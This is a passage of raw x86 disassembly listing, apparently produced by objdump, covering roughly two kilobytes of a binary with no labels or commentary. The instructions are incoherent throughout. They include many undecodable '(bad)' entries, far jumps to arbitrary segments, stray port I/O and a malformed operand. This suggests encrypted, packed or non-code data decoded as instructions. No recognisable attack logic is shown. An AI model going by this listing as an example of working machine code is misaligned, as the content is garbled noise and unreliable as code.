  408559:	(bad)  
  40855a:	(bad)  
  40855b:	jb     0x4085bc
  40855d:	sahf   
  40855e:	mov    dh,0xdc
  408560:	add    DWORD PTR [edi+0x6c],ebp
  408563:	mov    BYTE PTR [esi-0x378922be],dh
  408569:	jbe    0x40853a
  40856b:	enter  0x72d1,0x5c
  40856f:	inc    esi
  408570:	or     DWORD PTR [ebx-0x67d07d47],edi
  408576:	push   eax
  408577:	(bad)  
  408578:	pop    ecx
  408579:	test   eax,0x77d7fa68
  40857e:	aas    
  40857f:	jmp    0x8765e133
  408584:	sub    DWORD PTR [ebp+0x702367a6],esi
  40858a:	push   edx
  40858b:	inc    ecx
  40858c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40858d:	inc    ebx
  40858e:	pop    edi
  40858f:	adc    DWORD PTR [ebp-0x47],ecx
  408592:	jbe    0x4085d2
  408594:	pop    edi
  408595:	imul   ebp,DWORD PTR ds:0x3a817810,0xc8d5c849
  40859f:	loopne 0x40861e
  4085a1:	cmc    
  4085a2:	mov    eax,ds:0x1c699820
  4085a7:	pop    edi
  4085a8:	and    DWORD PTR [edx+edi*2+0x3f875d98],0x325fc3e
  4085b3:	jle    0x408558
  4085b5:	enter  0xd583,0x53
  4085b9:	neg    ecx
  4085bb:	jmp    0x4085fa
  4085bd:	jp     0x408624
  4085bf:	and    dl,BYTE PTR [edx+0x3a]
  4085c2:	fcomp  QWORD PTR [eax+0x12]
  4085c5:	xchg   edx,eax
  4085c6:	and    DWORD PTR [ebp+0xd],ebx
  4085c9:	jecxz  0x408624
  4085cb:	sbb    eax,0x697cbe7a
  4085d0:	lods   al,BYTE PTR ds:[esi]
  4085d2:	or     BYTE PTR [ecx-0x33],dh
  4085d5:	scas   eax,DWORD PTR es:[edi]
  4085d6:	inc    edi
  4085d7:	ins    DWORD PTR es:[edi],dx
  4085d8:	sbb    al,0xc9
  4085da:	shr    ecx,1
  4085dc:	mov    ebp,0x442d6cc0
  4085e1:	adc    al,0x92
  4085e3:	cmc    
  4085e4:	rcl    DWORD PTR cs:0x83b468f5,1
  4085eb:	or     bl,BYTE PTR [edi-0x56]
  4085ee:	add    al,BYTE PTR [eax+ecx*1+0x5c3154da]
  4085f5:	add    BYTE PTR [esi+0x728af0a1],ah
  4085fb:	call   0x12ef:0xa125dbe7
  408602:	pushf  
  408603:	pop    edx
  408604:	jne    0x40858d
  408606:	fist   WORD PTR [esi+0x51]
  408609:	test   DWORD PTR [ebp+0x33],0xe675eabe
  408610:	aas    
  408611:	inc    ebp
  408612:	js     0x4085d1
  408614:	aas    
  408615:	test   ebx,edi
  408617:	stos   BYTE PTR es:[edi],al
  408618:	iret   
  408619:	cmp    DWORD PTR [eax],ebp
  40861b:	push   ecx
  40861c:	mov    al,0x5e
  40861e:	call   0x2162944a
  408623:	push   esi
  408624:	mul    DWORD PTR [edi]
  408626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408627:	das    
  408628:	cmp    al,0x6b
  40862a:	sub    DWORD PTR [ecx+0x2011ecaf],esp
  408630:	push   eax
  408631:	push   ecx
  408632:	pop    ecx
  408633:	push   eax
  408634:	into   
  408635:	out    dx,eax
  408636:	imul   ebx,DWORD PTR [ecx-0x57],0x25e23054
  40863d:	in     eax,0x1e
  40863f:	ficomp DWORD PTR [eax+0x3a]
  408642:	sub    eax,0x34c39fad
  408647:	repz fwait
  408649:	push   eax
  40864a:	call   0x5188:0x216556a5
  408651:	mov    ebp,DWORD PTR [ebx]
  408653:	mov    al,0xa6
  408655:	mov    ah,0x9e
  408657:	add    al,0x83
  408659:	xor    dl,ah
  40865b:	mov    bl,0xd7
  40865d:	ret    
  40865e:	cmp    eax,edi
  408660:	and    DWORD PTR [ebx+eiz*4],0x5db92302
  408667:	fs and al,0x9
  40866a:	dec    edi
  40866b:	lock jnp 0x40860f
  40866e:	and    edi,0x3b0859f9
  408674:	std    
  408675:	mov    edi,DWORD PTR [ebx+0x2779eea2]
  40867b:	dec    ecx
  40867c:	retf   0x9a82
  40867f:	sbb    edx,DWORD PTR [eax+0x11bea47f]
  408685:	inc    ebx
  408686:	push   esi
  408687:	fisub  DWORD PTR [ecx+0x55]
  40868a:	aas    
  40868b:	xchg   DWORD PTR [ecx-0x57],edx
  40868e:	mov    esp,0x466e4ab5
  408693:	add    bh,BYTE PTR [edi]
  408695:	cwde   
  408696:	nop
  408697:	sub    al,0xe4
  408699:	les    eax,FWORD PTR [eax]
  40869b:	jmp    0xca2d2bd0
  4086a0:	gs into 
  4086a2:	jns    0x408647
  4086a4:	sbb    bl,BYTE PTR [edi+0x5e]
  4086a7:	pop    esi
  4086a8:	jmp    0x7a245648
  4086ad:	xchg   ecx,eax
  4086ae:	test   esi,0xeba164de
  4086b4:	xor    DWORD PTR [ebx],0x7ed2a822
  4086ba:	adc    ebx,DWORD PTR [edx+0x6c003b57]
  4086c0:	cmp    al,0x5c
  4086c2:	sub    BYTE PTR [eax],bl
  4086c4:	loopne 0x40868c
  4086c6:	ftst   
  4086c8:	outs   dx,BYTE PTR ds:[esi]
  4086c9:	adc    DWORD PTR [ebp+edi*4+0xb1c5eb4],0x42d02f37
  4086d4:	popa   
  4086d5:	sub    dl,0x10
  4086d8:	jb     0x4086e9
  4086da:	mov    cl,0xb
  4086dc:	daa    
  4086dd:	adc    BYTE PTR [ecx+0x79e522b2],cl
  4086e3:	popf   
  4086e4:	outs   dx,DWORD PTR ds:[esi]
  4086e5:	xchg   esp,eax
  4086e6:	out    dx,al
  4086e7:	inc    esp
  4086e8:	sar    DWORD PTR [ebx],0x2
  4086eb:	lock adc BYTE PTR [ebp-0x5a],ah
  4086ef:	jle    0x408686
  4086f1:	fldl2e 
  4086f3:	adc    bl,BYTE PTR [ebx]
  4086f5:	and    eax,0xee1f5a65
  4086fa:	mov    al,ds:0xd1cda9ce
  4086ff:	mov    eax,0xd1998a39
  408704:	(bad)
  408709:	add    eax,0xe100646c
  40870e:	sahf   
  40870f:	mov    bl,0xe5
  408711:	out    dx,eax
  408712:	dec    ebp
  408713:	and    ebp,DWORD PTR [edi]
  408715:	or     ch,ch
  408717:	(bad)  
  408718:	shr    DWORD PTR [ebx],0x8
  40871b:	sbb    edx,ecx
  40871d:	lods   al,BYTE PTR ds:[esi]
  40871e:	and    al,0x4d
  408720:	cmp    esp,DWORD PTR [edx-0xa]
  408723:	lods   al,BYTE PTR ds:[esi]
  408724:	fcmovnbe st,st(1)
  408726:	xchg   esi,eax
  408727:	fld    TBYTE PTR [ecx]
  408729:	ret    
  40872a:	cmp    DWORD PTR [edx],0xffffff99
  40872d:	in     eax,0x6c
  40872f:	cmp    eax,0xd642bdfa
  408734:	lods   al,BYTE PTR ds:[esi]
  408735:	out    0xdc,eax
  408737:	out    0xe9,eax
  408739:	cmp    al,0xdb
  40873b:	into   
  40873c:	sbb    DWORD PTR [ebx-0x7353d52d],ecx
  408742:	fcmovnbe st,st(2)
  408744:	aam    0xe4
  408746:	cmp    al,0x1d
  408748:	fcom   DWORD PTR [edx-0x4a7aae97]
  40874e:	fldcw  WORD PTR [ecx]
  408750:	cli    
  408751:	mov    al,ds:0xec2774a8
  408756:	(bad)  
  408757:	mov    esi,0xd672b3d6
  40875c:	mov    al,ds:0xba470b64
  408761:	dec    eax
  408762:	fstp   QWORD PTR [edx-0x4314cf12]
  408768:	and    BYTE PTR [ecx+0x56bcc67],ch
  40876e:	ret    
  40876f:	or     eax,0x5223b51f
  408774:	push   fs
  408776:	push   ds
  408777:	test   DWORD PTR [ebp+0xff21e9a],ebp
  40877d:	call   0x8249:0x89b8e9bb
  408784:	pushf  
  408785:	rcr    BYTE PTR [esi-0x4f],cl
  408788:	or     eax,0x876b1e35
  40878d:	test   eax,0x57a5642d
  408792:	xor    DWORD PTR [edi+0x70c42fae],0xffffff91
  408799:	mov    dl,BYTE PTR [eax]
  40879b:	jp     0x4087fa
  40879d:	lods   al,BYTE PTR fs:[esi]
  40879f:	daa    
  4087a0:	push   esi
  4087a1:	cs loopne 0x408735
  4087a4:	mov    bh,ah
  4087a6:	dec    esp
  4087a7:	lahf   
  4087a8:	mov    al,0x7
  4087aa:	jbe    0x40876c
  4087ac:	int3   
  4087ad:	lea    esi,[edx-0x3f215df5]
  4087b3:	pop    ss
  4087b4:	and    DWORD PTR [esi],ebx
  4087b6:	daa    
  4087b7:	sub    eax,0xb92d9636
  4087bc:	sar    dh,cl
  4087be:	jno    0x408778
  4087c0:	pop    ss
  4087c1:	pusha  
  4087c2:	jb     0x408797
  4087c4:	push   ds
  4087c5:	cmc    
  4087c6:	xor    BYTE PTR [ecx-0x4c6a990d],ch
  4087cc:	sub    eax,0x580f1e73
  4087d1:	dec    ecx
  4087d2:	xlat   BYTE PTR ds:[ebx]
  4087d3:	call   DWORD PTR [edi]
  4087d5:	lods   al,BYTE PTR ds:[esi]
  4087d6:	retf   0x422
  4087d9:	lahf   
  4087da:	jns    0x40877d
  4087dc:	and    ebp,DWORD PTR [edx-0xe]
  4087df:	add    ch,BYTE PTR [edi+0x62]
  4087e2:	test   BYTE PTR [ecx-0x7c2e58b5],dl
  4087e8:	mov    esp,0x5aaa72fb
  4087ed:	fcomp  DWORD PTR [edi+0x2f86818]
  4087f3:	xchg   esp,eax
  4087f5:	mov    bl,0xdb
  4087f7:	hlt    
  4087f8:	shl    DWORD PTR [ecx+ecx*1-0x24],0x74
  4087fd:	push   ds
  4087fe:	aas    
  4087ff:	mov    edx,0x654292ff
  408804:	mov    ah,0x7b
  408806:	dec    eax
  408807:	shr    DWORD PTR [esi-0x3cf35f9d],cl
  40880d:	adc    al,0xb0
  40880f:	out    dx,eax
  408810:	iret   
  408811:	pop    edi
  408812:	mov    bh,0xa
  408814:	ror    DWORD PTR [ebp+0x7aac3e96],1
  40881a:	icebp  
  40881b:	or     esp,esp
  40881d:	inc    edi
  40881e:	daa    
  40881f:	repnz ins BYTE PTR es:[edi],dx
  408821:	mov    BYTE PTR [edi-0x3e],ch
  408824:	pop    es
  408825:	adc    bl,BYTE PTR [edi+0x18]
  408828:	call   0xed50:0xe2ca6b6
  40882f:	hlt    
  408830:	push   ebp
  408831:	pop    ebp
  408832:	shr    esi,1
  408834:	or     esp,DWORD PTR [edi-0x7feba3fb]
  40883a:	jae    0x40881a
  40883c:	xor    ebp,DWORD PTR [edi+0x59]
  40883f:	pop    edx
  408840:	inc    ebp
  408841:	sbb    eax,0xbfbd7a6d
  408846:	pop    eax
  408847:	sahf   
  408848:	leave  
  408849:	push   0x69a42a42
  40884e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40884f:	lods   al,BYTE PTR ds:[esi]
  408850:	stos   DWORD PTR es:[edi],eax
  408851:	and    ah,BYTE PTR [ebp+ebp*8-0x11]
  408855:	arpl   WORD PTR [esi+0x3347a30],bx
  40885b:	mov    BYTE PTR [ebx-0x23],al
  40885e:	out    0xb3,eax
  408860:	xchg   ecx,eax
  408861:	jge    0x408811
  408863:	mov    dl,0xb3
  408865:	jmp    0xe24f640c
  40886a:	jle    0x408822
  40886c:	push   ebp
  40886d:	sub    BYTE PTR [ebx],ch
  40886f:	sbb    eax,0x75cd2b16
  408874:	pop    ss
  408875:	pop    ebp
  408876:	dec    edx
  408877:	inc    ebx
  408878:	sub    bh,cl
  40887a:	jge    0x408854
  40887c:	shl    BYTE PTR [ecx-0x12218f84],cl
  408882:	mov    eax,0x9f9ae959
  408887:	push   edi
  408888:	adc    eax,0x5ecaa3f3
  40888d:	outs   dx,BYTE PTR ds:[esi]
  40888e:	xchg   ecx,eax
  40888f:	into   
  408890:	jmp    0x17ec:0x4c5d3bd6
  408897:	cmp    esi,edi
  408899:	retf   
  40889a:	sbb    esi,DWORD PTR [edi+0x38]
  40889d:	lods   al,BYTE PTR gs:[esi]
  40889f:	jg     0x4088ea
  4088a1:	xchg   ecx,eax
  4088a2:	jo     0x40888a
  4088a4:	stos   BYTE PTR es:[edi],al
  4088a5:	mov    ebp,ebp
  4088a7:	or     eax,0x2a480553
  4088ac:	fimul  DWORD PTR [ebx]
  4088ae:	push   cs
  4088af:	xchg   ebx,eax
  4088b0:	sub    eax,0xcac4be5b
  4088b5:	jge    0x4088e0
  4088b7:	out    dx,eax
  4088b8:	ss jg  0x40886b
  4088bb:	fdiv   QWORD PTR [ecx-0x70]
  4088be:	jnp    0x408925
  4088c0:	jp     0x408928
  4088c2:	add    al,0x6b
  4088c4:	into   
  4088c5:	enter  0xce03,0xf9
  4088c9:	cmc    
  4088ca:	push   esi
  4088cb:	sar    DWORD PTR ds:0xe9de7b0,1
  4088d1:	push   ss
  4088d2:	(bad)  
  4088d3:	sbb    bl,BYTE PTR [edx-0x214108b2]
  4088d9:	lea    eax,[ebp+0x5e]
  4088dc:	xchg   esp,eax
  4088dd:	jmp    0x44b79bd2
  4088e2:	out    dx,al
  4088e3:	das    
  4088e4:	lea    ecx,[esi]
  4088e6:	popa   
  4088e7:	xor    eax,0xf7205594
  4088ec:	push   0xffffffbf
  4088ee:	call   0xfbd8832e
  4088f3:	outs   dx,DWORD PTR ds:[esi]
  4088f4:	test   eax,0xb385ee4d
  4088f9:	lds    ecx,FWORD PTR [edx+0x7644c9d]
  4088ff:	push   ss
  408900:	sbb    cl,dh
  408902:	xchg   dl,ah
  408904:	xchg   ebx,eax
  408905:	inc    esi
  408906:	call   0xbf41e671
  40890b:	cli    
  40890c:	ss in  eax,0x90
  40890f:	imul   esp,DWORD PTR [ebx],0xffffffe6
  408912:	jbe    0x408913
  408914:	std    
  408915:	imul   esi,DWORD PTR [ebx-0x2885d800],0xdb969677
  40891f:	cmp    esp,DWORD PTR [ecx-0x19]
  408922:	fdiv   st(0),st
  408924:	sti    
  408925:	and    ebp,DWORD PTR [eax]
  408927:	jmp    0xca3:0xead2adbe
  40892e:	(bad)  
  40892f:	ret    
  408930:	add    al,0xf9
  408932:	mov    WORD PTR [esi-0x3ea26fca],cs
  408938:	in     al,0x7d
  40893a:	mov    eax,ds:0x3a8175bb
  40893f:	cmp    eax,0xc2270bda
  408944:	in     eax,0xf2
  408946:	pusha  
  408947:	cmc    
  408948:	sar    eax,1
  40894a:	fist   WORD PTR [eax]
  40894c:	sti    
  40894d:	div    al
  40894f:	pop    ds
  408950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408951:	dec    ebp
  408952:	scas   eax,DWORD PTR es:[edi]
  408953:	jne    0x408991
  408955:	push   esp
  408956:	enter  0x514,0x35
  40895a:	mov    eax,0xa1a9ea2
  40895f:	push   esi
  408960:	int    0x9f
  408962:	or     bh,al
  408964:	ins    BYTE PTR es:[edi],dx
  408965:	xchg   eax,ebp
  408967:	and    BYTE PTR [esi+0x57],0xbd
  40896b:	dec    esi
  40896c:	test   al,0x36
  40896e:	popa   
  40896f:	sub    esp,edi
  408971:	dec    eax
  408972:	add    ebx,ebx
  408974:	aam    0x23
  408976:	imul   ebp,ebp,0xffffffc8
  408979:	popa   
  40897a:	inc    esi
  40897b:	sar    DWORD PTR [esp+ecx*8-0x7123b7d3],0x76
  408983:	call   0xeee0:0x5ce80f3d
  40898a:	mov    dl,0x9f
  40898c:	xchg   esi,eax
  40898d:	jecxz  0x40892b
  40898f:	mov    ebx,0x9ec888b
  408994:	aad    0x6d
  408996:	pop    ss
  408997:	mov    ebp,0xffc46017
  40899c:	add    BYTE PTR [eax],dl
  40899e:	mov    eax,0xbda1fcc2
  4089a3:	dec    esi
  4089a4:	jp     0x40894a
  4089a6:	mov    al,ds:0xdb60aba5
  4089ab:	aas    
  4089ac:	push   cs
  4089ad:	hlt    
  4089ae:	cld    
  4089af:	ds jne 0x40893c
  4089b2:	(bad)  
  4089b3:	dec    esi
  4089b4:	cmc    
  4089b5:	out    0x1d,al
  4089b7:	sbb    ah,BYTE PTR ds:0xdd476b07
  4089bd:	aaa    
  4089be:	stos   BYTE PTR es:[edi],al
  4089bf:	rcl    BYTE PTR [ecx],1
  4089c1:	adc    DWORD PTR [edi+0x77],esi
  4089c4:	and    BYTE PTR ds:0xca45a8ff,bh
  4089ca:	mov    edx,0xf454ab3b
  4089cf:	xchg   esi,eax
  4089d0:	add    al,0xd6
  4089d2:	mul    edx
  4089d4:	test   al,0x69
  4089d6:	add    eax,0x726e49c9
  4089db:	dec    ebp
  4089dc:	outs   dx,DWORD PTR ds:[esi]
  4089dd:	add    BYTE PTR ds:0xcaeb1aa0,bh
  4089e3:	sub    cl,BYTE PTR [ecx-0x41]
  4089e6:	sub    DWORD PTR [eax],esp
  4089e8:	xor    al,0x43
  4089ea:	ret    0x2583
  4089ed:	imul   esp,ebx,0xffffffed
  4089f0:	in     al,0x4e
  4089f2:	cmp    bh,BYTE PTR [ebx+0x2b]
  4089f5:	sub    DWORD PTR [eax-0x4c],edi
  4089f8:	daa    
  4089f9:	xor    esi,DWORD PTR [edi+ebp*8+0x6a62277f]
  408a00:	into   
  408a01:	mov    cl,0x28
  408a03:	or     eax,0xa2a375af
  408a08:	mov    ?,ecx
  408a0a:	cmp    DWORD PTR gs:[ecx+0x2d1498eb],ebx
  408a11:	stc    
  408a12:	(bad)  
  408a13:	jmp    0x6aee:0xb27c88cf
  408a1a:	addr16 mov bh,0xaf
  408a1d:	mov    bl,0x1e
  408a1f:	xor    eax,0xc2f033ef
  408a24:	idiv   DWORD PTR [esi+0x79]
  408a27:	in     eax,0xea
  408a29:	pop    esp
  408a2a:	mov    esi,0x3a939057
  408a2f:	sub    DWORD PTR ds:0x80f1ae1e,edx
  408a35:	jmp    0xf846dbe6
  408a3a:	adc    al,0xca
  408a3c:	in     eax,dx
  408a3d:	pop    ds
  408a3e:	jecxz  0x408aa0
  408a40:	xchg   esp,eax
  408a41:	push   ebx
  408a42:	mov    ebp,DWORD PTR [esi]
  408a44:	ror    DWORD PTR [eax-0x378ba7c3],0x6d
  408a4b:	inc    eax
  408a4c:	or     DWORD PTR [eax-0x7597b6cb],ebx
  408a52:	das    
  408a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a54:	mov    bh,0xec
  408a56:	sti    
  408a57:	or     al,0x1e
  408a59:	aaa    
  408a5a:	and    BYTE PTR [eax+0x1bf61699],0xbf
  408a61:	es xchg esi,eax
  408a63:	cmp    BYTE PTR [ebx-0x27993f24],bh
  408a69:	(bad)  
  408a6a:	push   ds
  408a6b:	bound  ebp,QWORD PTR [esi-0x15]
  408a6e:	jnp    0x408a5b
  408a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a71:	jle    0x408aa5
  408a73:	outs   dx,BYTE PTR ds:[esi]
  408a74:	cmp    BYTE PTR [ecx-0x5f],dl
  408a77:	pop    edi
  408a78:	pop    ebp
  408a79:	pop    esi
  408a7a:	xor    al,0xea
  408a7c:	fisubr WORD PTR [ecx+0x27]
  408a7f:	test   ebp,esi
  408a81:	mov    dh,BYTE PTR [ebp+0x9]
  408a84:	cld    
  408a85:	jae    0x408adb
  408a87:	xchg   esi,eax
  408a88:	push   esp
  408a89:	ins    BYTE PTR es:[edi],dx
  408a8a:	pop    ecx
  408a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a8c:	push   eax
  408a8d:	pop    edi
  408a8e:	mov    ebp,0xe4ccb967
  408a93:	and    BYTE PTR [eax+0x16],dl
  408a96:	pop    edx
  408a97:	sbb    eax,0xf06ed322
  408a9c:	les    eax,FWORD PTR [esi-0x6c]
  408a9f:	pushf  
  408aa0:	aad    0x64
  408aa2:	mov    ds:0xaa043e8b,al
  408aa7:	push   esp
  408aa8:	cmp    al,0x36
  408aaa:	imul   edi,DWORD PTR [edx+0x1],0x859de3c6
  408ab1:	ret    
  408ab2:	and    BYTE PTR [esi+0x23],dh
  408ab5:	adc    DWORD PTR [ebx+0x4ec3a78e],ebx
  408abb:	dec    ebx
  408abc:	and    BYTE PTR [ebp-0x27ed0444],al
  408ac2:	push   0xffffffb5
  408ac4:	loop   0x408b42
  408ac6:	or     DWORD PTR [esi+0x58],ebx
  408ac9:	sahf   
  408aca:	cmc    
  408acb:	mov    al,0x3e
  408acd:	loop   0x408aa3
  408acf:	lea    esi,[ebx-0xebadda2]
  408ad5:	nop
  408ad6:	mov    ebp,edx
  408ad8:	xchg   esi,eax
  408ad9:	pop    ecx
  408ada:	out    dx,al
  408adb:	retf   
  408adc:	sub    al,0xf2
  408ade:	aam    0xa8
  408ae0:	sbb    al,bl
  408ae2:	sub    DWORD PTR [ebx],eax
  408ae4:	push   cs
  408ae5:	lods   eax,DWORD PTR ds:[esi]
  408ae6:	lods   eax,DWORD PTR ds:[esi]
  408ae7:	hlt    
  408ae8:	mov    bh,0x99
  408aea:	xor    al,0x3
  408aec:	xchg   edx,eax
  408aed:	xchg   esp,eax
  408aee:	jns    0x408a73
  408af0:	xchg   esp,eax
  408af1:	dec    ecx
  408af2:	push   0xffffff83
  408af4:	push   esp
  408af5:	fcmovnb st,st(5)
  408af7:	in     eax,0x49
  408af9:	adc    eax,0x1ee376e3
  408afe:	leave  
  408aff:	test   DWORD PTR [edi],0x91acbe08
  408b05:	fcomp  DWORD PTR [eax+0x2d]
  408b08:	mov    bh,0x61
  408b0a:	call   0xf72322b3
  408b0f:	std    
  408b10:	lods   al,BYTE PTR ds:[esi]
  408b11:	mov    ebp,0x8f722f05
  408b16:	inc    ebp
  408b17:	push   ss
  408b18:	and    al,0x3b
  408b1a:	ins    BYTE PTR es:[edi],dx
  408b1b:	jne    0x408b37
  408b1d:	sbb    DWORD PTR [ecx-0x29],0x4c3fe0d9
  408b24:	call   0x1b:0x429474b6
  408b2b:	pop    eax
  408b2c:	ret    
  408b2d:	(bad)  
  408b2f:	mov    DWORD PTR [edi],eax
  408b31:	pop    esp
  408b32:	sub    dl,BYTE PTR [esi]
  408b34:	sub    esi,0xfffffff6
  408b37:	repz arpl WORD PTR [edi],di
  408b3a:	cmp    DWORD PTR [ebp+0x7b],edx
  408b3d:	popf   
  408b3e:	jmp    0x5aef:0x94f11b2
  408b45:	sub    eax,0xfd6c8443
  408b4a:	mov    edi,0x793e576
  408b4f:	cmp    al,0x17
  408b51:	push   edi
  408b52:	and    ebx,DWORD PTR [edx]
  408b54:	test   DWORD PTR [edx+0x5e],ebx
  408b57:	dec    edi
  408b58:	mov    ebx,0x507fc356
  408b5d:	ret    0x246e
  408b60:	mov    esi,0x7d6b7c89
  408b65:	ins    BYTE PTR es:[edi],dx
  408b66:	mov    ch,0xb8
  408b68:	leave  
  408b69:	or     bl,dl
  408b6b:	jecxz  0x408bdd
  408b6d:	jbe    0x408bb1
  408b6f:	push   eax
  408b70:	je     0x408af3
  408b72:	test   edi,edi
  408b74:	das    
  408b75:	loopne 0x408bf4
  408b77:	dec    eax
  408b78:	ins    BYTE PTR es:[edi],dx
  408b79:	loopne 0x408b59
  408b7b:	inc    ebp
  408b7c:	and    DWORD PTR [ebx+0xaba2cf1],eax
  408b82:	push   ss
  408b83:	add    al,0x0
  408b85:	and    esp,DWORD PTR [edx-0x7e0cbbc3]
  408b8b:	ror    ebx,0x50
  408b8e:	addr16 add dh,cl
  408b91:	xchg   esp,eax
  408b92:	dec    esi
  408b93:	loope  0x408bc0
  408b95:	sti    
  408b96:	inc    esp
  408b97:	les    ebx,FWORD PTR [edi-0x23]
  408b9a:	jnp    0x408b9f
  408b9c:	adc    al,0x2
  408b9e:	scas   al,BYTE PTR es:[edi]
  408b9f:	push   ss
  408ba0:	adc    eax,0x8f67d0ba
  408ba5:	sti    
  408ba6:	lock retf 0x9842
  408baa:	jmp    0xd6eb0e74
  408baf:	dec    esp
  408bb0:	pop    edx
  408bb1:	mov    esp,0x8dbe189a
  408bb6:	(bad)  
  408bb7:	sbb    DWORD PTR [eax],esi
  408bb9:	aaa    
  408bba:	sbb    DWORD PTR [ebx+0x7f],0xffffffad
  408bbe:	in     eax,dx
  408bbf:	rcl    dh,cl
  408bc1:	ss lahf 
  408bc3:	div    BYTE PTR [esi-0xc]
  408bc6:	mov    ecx,0xf24a3025
  408bcb:	xor    esi,DWORD PTR [ebp-0x18ab7af9]
  408bd1:	push   ebx
  408bd2:	mov    al,fs:0x4957a6f9
  408bd8:	xchg   DWORD PTR [esi],esp
  408bda:	push   es
  408bdb:	and    eax,0x49354e1c
  408be0:	ja     0x408c5e
  408be2:	jmp    0x4e67:0xe620e38b
  408be9:	inc    esi
  408bea:	cld    
  408beb:	jp     0x408c0f
  408bed:	cmp    al,0x37
  408bef:	clc    
  408bf0:	push   ss
  408bf1:	retf   
  408bf2:	mov    dl,0xd8
  408bf4:	(bad)  
  408bf5:	jnp    0x408bdf
  408bf7:	hlt    
  408bf8:	aam    0x3b
  408bfa:	and    eax,0x56d2b39b
  408bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c00:	or     edi,0x5f
  408c03:	int    0x9c
  408c05:	daa    
  408c06:	rcr    DWORD PTR [eax+0x70],1
  408c09:	xchg   edx,eax
  408c0a:	in     al,dx
  408c0b:	not    DWORD PTR ds:0xde750f98
  408c11:	iret   
  408c12:	or     ebp,eax
  408c14:	jle    0x408c64
  408c16:	add    al,0x5a
  408c18:	int3   
  408c19:	push   edx
  408c1a:	cld    
  408c1b:	mov    al,0xbf
  408c1d:	jno    0x408bd4
  408c1f:	mov    edx,0x5614fb53
  408c24:	test   eax,0xe9d45999
  408c29:	enter  0x5bcb,0xa8
  408c2d:	add    DWORD PTR [ebx+0x1fb8bee6],ebp
  408c33:	in     eax,0xc6
  408c35:	cmp    al,0xcc
  408c37:	or     ah,ah
  408c39:	or     eax,0xd57ecea
  408c3e:	(bad)  
  408c3f:	retf   
  408c40:	and    ebx,DWORD PTR [edx+0x6c]
  408c43:	xor    DWORD PTR [edx-0x79b5f368],esp
  408c49:	xchg   edi,eax
  408c4a:	call   0x2583:0x183565b2
  408c51:	lock popa 
  408c53:	in     eax,0x7e
  408c55:	fidivr DWORD PTR [ebx+0x55dc5cfb]
  408c5b:	sub    BYTE PTR [edx-0x64d9612f],dh
  408c61:	push   es
  408c62:	in     al,0x71
  408c64:	scas   al,BYTE PTR es:[edi]
  408c65:	sbb    al,0xb
  408c67:	stc    
  408c68:	jnp    0x408c6f
  408c6a:	inc    esp
  408c6b:	call   0xe0c30888
  408c70:	and    bl,ch
  408c72:	scas   eax,DWORD PTR es:[edi]
  408c73:	sbb    eax,0x463bc9f5
  408c78:	bnd jno 0x408cee
  408c7b:	mov    ah,0xdb
  408c7d:	pop    esi
  408c7e:	scas   eax,DWORD PTR es:[edi]
  408c7f:	jno    0x408c71
  408c81:	fdiv   QWORD PTR [ebp-0x42]
  408c84:	mov    eax,ds:0xc6ef16d8
  408c89:	mov    al,0xd
  408c8b:	sub    ch,al
  408c8d:	jo     0x408c4f
  408c8f:	lahf   
  408c90:	mov    ecx,0xb75da86b
  408c95:	adc    bl,BYTE PTR [ebx]
  408c97:	mov    edi,0x6385c565
  408c9c:	gs push esp
  408c9e:	xor    eax,0xb84a6006
  408ca3:	addr16 cwde 
  408ca5:	test   BYTE PTR [edx-0x35],cl
  408ca8:	xlat   BYTE PTR ds:[ebx]
  408ca9:	sbb    BYTE PTR [ecx+ebx*1],ah
  408cac:	stos   DWORD PTR es:[edi],eax
  408cad:	cmp    DWORD PTR [edi+0x41],edx
  408cb0:	cs sub al,0x96
  408cb3:	sbb    BYTE PTR [eax+eiz*1+0x61],bl
  408cb7:	mov    edi,0x83e49520
  408cbc:	mov    esp,0x3d3614a8
  408cc1:	inc    ebp
  408cc2:	jne    0x408d18
  408cc4:	xor    ecx,DWORD PTR [esi]
  408cc6:	shl    DWORD PTR [edx-0x2eb99746],cl
  408ccc:	inc    esp
  408ccd:	mov    dl,BYTE PTR [edi+0x45788c0a]
  408cd3:	or     DWORD PTR [edx+0x44],esp
  408cd6:	add    al,BYTE PTR [esi]
  408cd8:	or     al,0xfe
  408cda:	fidiv  DWORD PTR ss:[edx]
  408cdd:	inc    esi
  408cde:	jg     0x408ca5
  408ce0:	pop    edx
  408ce1:	sar    al,1
  408ce3:	pop    edx
  408ce4:	das    
  408ce5:	scas   al,BYTE PTR es:[edi]
  408ce6:	jmp    0xf078b97e
  408ceb:	ins    BYTE PTR es:[edi],dx
  408cec:	adc    al,0xc7
  408cee:	mov    al,ds:0x8fd2c2d2
  408cf3:	lock aad 0x24
  408cf6:	jae    0x408d58
  408cf8:	cs cmp ebx,ebp
  408cfb:	lods   al,BYTE PTR ds:[esi]
  408cfc:	push   edx
  408cfd:	data16 aas 
  408cff:	sub    BYTE PTR gs:[ebx+edx*1+0x63],cl
  408d04:	sbb    eax,0x98b757d8
  408d09:	aaa    
  408d0a:	sbb    eax,DWORD PTR [ecx+edx*1+0x52]
  408d0e:	or     DWORD PTR [edi+0x19],eax
  408d11:	repnz adc DWORD PTR [ecx-0x49],esp
  408d15:	mov    gs:0xc96868e8,eax
  408d1b:	sub    eax,0x9aebdfc2
  408d20:	mov    ds:0xe978cf68,al
  408d25:	jl     0x408d97
  408d27:	or     BYTE PTR [ecx-0x27],ch
  408d2a:	int    0x2e
  408d2c:	gs in  al,0x7c
  408d2f:	jmp    0xd9dc:0xe8fdb00a
  408d36:	push   esp
  408d37:	(bad)  
  408d39:	sub    DWORD PTR [eax+0x7b],0x8f906445
  408d40:	pop    eax
  408d41:	mov    DWORD PTR [eax],edi
  408d43:	mov    esp,0x29f56ff4
  408d48:	cmp    DWORD PTR [eax+0x6f],0x2bef545f
  408d4f:	int3   
  408d50:	push   cs
  408d51:	mov    ch,0xa0
  408d53:	(bad)  
  408d54:	ds leave 
  408d56:	(bad)  
  408d57:	or     esp,DWORD PTR ds:0xbdbec5bb
  408d5d:	mov    dh,0x14
  408d5f:	fwait
  408d60:	nop
